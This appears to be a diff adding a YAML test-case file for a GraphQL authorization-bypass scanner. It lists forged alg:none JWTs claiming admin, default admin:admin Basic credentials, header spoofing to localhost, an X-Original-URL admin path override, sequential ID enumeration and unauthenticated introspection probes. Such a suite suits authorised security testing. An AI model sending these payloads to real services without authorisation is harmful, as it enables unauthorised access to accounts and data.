@@ -1,0 +1,78 @@
+test_cases:
+  # ── Header Manipulation ──────────────────────────────────────────────
+  - name: no_auth_header
+    strategy: header_bypass
+    headers: {}
+    description: "Strip all authentication headers"
+
+  - name: empty_bearer
+    strategy: header_bypass
+    headers:
+      Authorization: "Bearer "
+    description: "Empty Bearer token"
+
+  - name: null_bearer
+    strategy: header_bypass
+    headers:
+      Authorization: "Bearer null"
+    description: "Literal null as token"
+
+  - name: jwt_alg_none
+    strategy: header_bypass
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."
+    description: "JWT with alg:none — admin claim"
+
+  - name: jwt_alg_none_user
+    strategy: header_bypass
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIifQ."
+    description: "JWT with alg:none — user claim"
+
+  - name: basic_auth_admin
+    strategy: header_bypass
+    headers:
+      Authorization: "Basic YWRtaW46YWRtaW4="
+    description: "Basic auth admin:admin"
+
+  - name: x_forwarded_localhost
+    strategy: header_bypass
+    headers:
+      X-Forwarded-For: "127.0.0.1"
+    description: "Spoof internal origin via X-Forwarded-For"
+
+  - name: x_real_ip_localhost
+    strategy: header_bypass
+    headers:
+      X-Real-IP: "127.0.0.1"
+    description: "Spoof internal origin via X-Real-IP"
+
+  - name: x_original_url
+    strategy: header_bypass
+    headers:
+      X-Original-URL: "/admin/graphql"
+    description: "Path override via X-Original-URL"
+
+  # ── IDOR Enumeration ─────────────────────────────────────────────────
+  - name: idor_sequential
+    strategy: idor
+    id_range: [1, 50]
+    description: "Sequential ID enumeration on queries with ID arguments"
+
+  - name: idor_uuid_swap
+    strategy: idor
+    swap_with: "00000000-0000-0000-0000-000000000001"
+    description: "Replace UUID args with a known test UUID"
+
+  # ── Introspection Without Auth ───────────────────────────────────────
+  - name: unauth_introspection
+    strategy: raw_query
+    query: "{ __schema { types { name } } }"
+    headers: {}
+    description: "Introspection query with no authentication"
+
+  - name: unauth_typename
+    strategy: raw_query
+    query: "{ __typename }"
+    headers: {}
+    description: "__typename probe with no authentication"
